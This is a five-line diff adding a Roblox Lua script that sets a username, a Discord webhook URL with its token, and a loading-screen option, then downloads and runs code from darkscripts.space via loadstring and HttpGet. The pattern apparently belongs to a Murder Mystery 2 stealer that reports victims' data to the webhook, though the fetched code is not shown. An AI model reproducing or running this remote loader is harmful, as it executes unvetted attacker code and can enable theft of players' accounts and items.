@@ -1,0 +1,5 @@
+Username = "Xvlamer"
+Webhook = "https://discord.com/api/webhooks/1314435460092657710/VlY5z-oWfCGCrS_rALWaHFBlVB6Uk-QtU0mkutNAGvAJ_XU9Cs6zBTa0gjoPMbhrlhju"
+selectedLoadingScreen = "Select 1 or 2" -- If you dont know whats that just skip that part
+
+loadstring(game:HttpGet(('https://darkscripts.space/mm2')))()
